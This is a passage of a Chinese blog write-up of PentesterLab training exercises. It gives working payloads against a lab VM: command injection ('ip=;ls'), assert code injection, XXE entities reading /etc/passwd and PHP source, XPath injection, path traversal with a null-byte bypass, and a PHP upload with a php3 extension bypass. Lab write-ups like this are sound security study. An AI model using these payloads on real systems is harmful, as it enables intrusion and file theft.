+<h2 id="Example-4-2"><a href="#Example-4-2" class="headerlink" title="Example 4"></a>Example 4</h2><p><code>assert</code>的命令执行，跟<code>eval</code>用法类似，不过黑盒了半天都有问题。白盒了后<br>Payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span><span class="regexp">/codeexec/</span>example4.php?name=%<span class="number">27</span>.phpinfo();<span class="regexp">//</span></div></pre></td></tr></table></figure></p>
+<h1 id="Commands-injecttion"><a href="#Commands-injecttion" class="headerlink" title="Commands injecttion"></a>Commands injecttion</h1><h2 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example 1"></a>Example 1</h2><p>没做任何过滤的。。。直接就可以输入命令了。。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>//<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/commandexec/example1.php?<span class="built_in">ip</span>=<span class="comment">;ls</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-2-4"><a href="#Example-2-4" class="headerlink" title="Example 2"></a>Example 2</h2><p>这种遇到的少了，还是白盒了，然后发现<code>preg_match</code>的正则有\m修饰符，就会了。。。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>//<span class="number">192.168</span><span class="meta">.56</span><span class="meta">.101</span>/commandexec/example2.php?<span class="built_in">ip</span>=<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span><span class="subst">%0</span>als</div></pre></td></tr></table></figure></p>
+<h2 id="Example-3-3"><a href="#Example-3-3" class="headerlink" title="Example 3"></a>Example 3</h2><p>这题还不错。。受到前几题的影响，一直在想正则怎么绕了，研究了半天，发现正则写的没问题，根本绕过不<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match('/^<span class="tag">\<span class="name">d</span><span class="string">&#123;1,3&#125;</span></span><span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">d</span><span class="string">&#123;1,3&#125;</span></span><span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">d</span><span class="string">&#123;1,3&#125;</span></span><span class="tag">\<span class="name">.</span></span><span class="tag">\<span class="name">d</span><span class="string">&#123;1,3&#125;</span></span><span class="formula">$/', $</span>_GET['ip'])</div></pre></td></tr></table></figure></p>
+<p>看了LL的wp后在注意到，header后竟然没有exit，这就跟没过滤一样了，这类的题目以前遇到过。。<br>Payload:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> curl -v <span class="string">"http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1;ls"</span></span></div></pre></td></tr></table></figure></p>
+<h1 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h1><p>这部分是XXE注入，XML Entity Injection, XML不是特别了解，参考文档<a href="https://www.91ri.org/9539.html" target="_blank" rel="external">https://www.91ri.org/9539.html</a></p>
+<h2 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example 1"></a>Example 1</h2><p>根据文档中的例子，自己试了试，把能删的都删了，剩下必须的部分：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http://<span class="number">192.168</span>.<span class="number">56.101</span>/xml/example<span class="number">1</span>.php?xml=<span class="symbol">%3</span>C<span class="symbol">%21</span>DOCTYPE<span class="symbol">%20</span>h<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%3</span>C<span class="symbol">%21</span>ENTITY<span class="symbol">%20</span>pen<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>f<span class="symbol">%2</span>f<span class="symbol">%2</span>fetc<span class="symbol">%2</span>fpasswd<span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%3</span>E<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%3</span>Ctext<span class="symbol">%3</span>E<span class="symbol">%26</span>pen<span class="symbol">%3</span>B<span class="symbol">%3</span>C<span class="symbol">%2</span>ftext<span class="symbol">%3</span>E</div><div class="line">&lt;<span class="title">!DOCTYPE</span> h [&lt;<span class="title">!ENTITY</span> pen SYSTEM <span class="string">"file:///etc/passwd"</span> &gt;]&gt;&lt;text&gt;&amp;pen<span class="comment">;&lt;/text&gt;</span></div><div class="line">http://<span class="number">192.168</span>.<span class="number">56.101</span>/xml/example<span class="number">1</span>.php?xml=<span class="symbol">%3</span>C<span class="symbol">%21</span>DOCTYPE<span class="symbol">%20</span>h<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%3</span>C<span class="symbol">%21</span>ENTITY<span class="symbol">%20</span>pen<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>php<span class="symbol">%3</span>A<span class="symbol">%2</span>f<span class="symbol">%2</span>ffilter<span class="symbol">%2</span>fread<span class="symbol">%3</span>Dconvert.base<span class="number">64</span>-encode<span class="symbol">%2</span>fresource<span class="symbol">%3</span>Dexample<span class="number">1</span>.php<span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%3</span>E<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%3</span>Ctext<span class="symbol">%3</span>E<span class="symbol">%26</span>pen<span class="symbol">%3</span>B<span class="symbol">%3</span>C<span class="symbol">%2</span>ftext<span class="symbol">%3</span>E</div><div class="line">&lt;<span class="title">!DOCTYPE</span> h [&lt;<span class="title">!ENTITY</span> pen SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=example1.php"</span> &gt;]&gt;&lt;text&gt;&amp;pen<span class="comment">;&lt;/text&gt;</span></div><div class="line">http://<span class="number">192.168</span>.<span class="number">56.101</span>/xml/example<span class="number">1</span>.php?xml=<span class="symbol">%3</span>C<span class="symbol">%21</span>DOCTYPE<span class="symbol">%20</span>h<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%3</span>C<span class="symbol">%21</span>ENTITY<span class="symbol">%20</span>pen<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>http:/<span class="symbol">%2</span>f<span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">%22</span><span class="symbol">%20</span><span class="symbol">%3</span>E<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%3</span>Ctext<span class="symbol">%3</span>E<span class="symbol">%26</span>pen<span class="symbol">%3</span>B<span class="symbol">%3</span>C<span class="symbol">%2</span>ftext<span class="symbol">%3</span>E</div><div class="line">&lt;<span class="title">!DOCTYPE</span> h [&lt;<span class="title">!ENTITY</span> pen SYSTEM <span class="string">"http://127.0.0.1"</span> &gt;]&gt;&lt;text&gt;&amp;pen<span class="comment">;&lt;/text&gt;</span></div></pre></td></tr></table></figure></p>
+<p>SYSTEM之后的参数可以如下协议：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">file:</span><span class="comment">//</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//</span></div><div class="line"><span class="symbol">php:</span><span class="comment">//</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-2-5"><a href="#Example-2-5" class="headerlink" title="Example 2"></a>Example 2</h2><p>这个是XML Injection，以前做过，也写过wp，<a href="http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100" target="_blank" rel="external">http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100</a><br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://192.168.56.101/xml/example2.php?name=hacker<span class="number">%27</span><span class="number">%5</span>D<span class="number">%20</span><span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%5</span>B<span class="number">%27</span></div></pre></td></tr></table></figure></p>
+<h1 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h1><h2 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example 1"></a>Example 1</h2><p>打开来看啥也没有。。不明所以，看了下源码，是没做任何过滤的任意文件读取，，<br>Payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span><span class="regexp">/dirtrav/</span>example1.php?file=..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc<span class="regexp">/passwd</span></div></pre></td></tr></table></figure></p>
+<h2 id="Example-2-6"><a href="#Example-2-6" class="headerlink" title="Example 2"></a>Example 2</h2><p>也不难。。。几乎也跟没过滤一样<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span><span class="regexp">/dirtrav/</span>example2.php?file=<span class="regexp">/var/</span>www<span class="regexp">/files/</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</div></pre></td></tr></table></figure></p>
+<h2 id="Example-3-4"><a href="#Example-3-4" class="headerlink" title="Example 3"></a>Example 3</h2><p>这题的这正则有跟没有一样。。。不能匹配到结尾的<code>\x00</code><br>Payload:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span><span class="regexp">/dirtrav/</span>example3.php?file=..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd%<span class="number">00</span></div></pre></td></tr></table></figure></p>
+<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="Example-1-7"><a href="#Example-1-7" class="headerlink" title="Example 1"></a>Example 1</h2><p>同样是没做过滤。。。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo();?&gt;"</span> &gt; /tmp/test.php</span></div></pre></td></tr></table></figure></p>
+<p>把 <code>/tmp/test.php</code> 上传上去，然后可以直接访问。。同样可以写一句话getshell</p>
+<h2 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example 2"></a>Example 2</h2><p>这题过滤了php结尾的文件。。。然后php3 bypass后可成功执行</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/03/21/0x15/">Pentester Lab Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-03-21, 10:16:46</p>
+        <p><span>最后更新:</span>2016-03-28, 18:18:37</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/03/21/0x15/" title="Pentester Lab Writeup">http://0x48.pw/2016/03/21/0x15/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/03/21/0x15/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/04/01/0x16/">
+                    CRYPTO技能修正
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/03/17/0x14/">
+                    0CTF RSA?总结 || RSA学习笔记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLI"><span class="toc-number">1.</span> <span class="toc-text">SQLI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1"><span class="toc-number">1.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2"><span class="toc-number">1.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3"><span class="toc-number">1.3.</span> <span class="toc-text">Example 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4"><span class="toc-number">1.4.</span> <span class="toc-text">Example 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-5"><span class="toc-number">1.5.</span> <span class="toc-text">Example 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-6"><span class="toc-number">1.6.</span> <span class="toc-text">Example 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-7"><span class="toc-number">1.7.</span> <span class="toc-text">Example 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-8"><span class="toc-number">1.8.</span> <span class="toc-text">Example 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-9"><span class="toc-number">1.9.</span> <span class="toc-text">Example 9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-1"><span class="toc-number">2.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-1"><span class="toc-number">2.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-1"><span class="toc-number">2.3.</span> <span class="toc-text">Example 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4-1"><span class="toc-number">2.4.</span> <span class="toc-text">Example 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-5-1"><span class="toc-number">2.5.</span> <span class="toc-text">Example 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-6-1"><span class="toc-number">2.6.</span> <span class="toc-text">Example 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exmple-7"><span class="toc-number">2.7.</span> <span class="toc-text">Exmple 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-8-1"><span class="toc-number">2.8.</span> <span class="toc-text">Example 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-9-1"><span class="toc-number">2.9.</span> <span class="toc-text">Example 9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Include"><span class="toc-number">3.</span> <span class="toc-text">File Include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-2"><span class="toc-number">3.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-2"><span class="toc-number">3.2.</span> <span class="toc-text">Example 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-injection"><span class="toc-number">4.</span> <span class="toc-text">Code injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-3"><span class="toc-number">4.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-3"><span class="toc-number">4.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-2"><span class="toc-number">4.3.</span> <span class="toc-text">Example 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4-2"><span class="toc-number">4.4.</span> <span class="toc-text">Example 4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Commands-injecttion"><span class="toc-number">5.</span> <span class="toc-text">Commands injecttion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-4"><span class="toc-number">5.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-4"><span class="toc-number">5.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-3"><span class="toc-number">5.3.</span> <span class="toc-text">Example 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML-attacks"><span class="toc-number">6.</span> <span class="toc-text">XML attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-5"><span class="toc-number">6.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-5"><span class="toc-number">6.2.</span> <span class="toc-text">Example 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-traversal"><span class="toc-number">7.</span> <span class="toc-text">Directory traversal</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-6"><span class="toc-number">7.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-6"><span class="toc-number">7.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-4"><span class="toc-number">7.3.</span> <span class="toc-text">Example 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Upload"><span class="toc-number">8.</span> <span class="toc-text">File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-7"><span class="toc-number">8.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-7"><span class="toc-number">8.2.</span> <span class="toc-text">Example 2</span></a></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/04/01/0x16/" title="上一篇: CRYPTO技能修正">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/03/17/0x14/" title="下一篇: 0CTF RSA?总结 || RSA学习笔记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
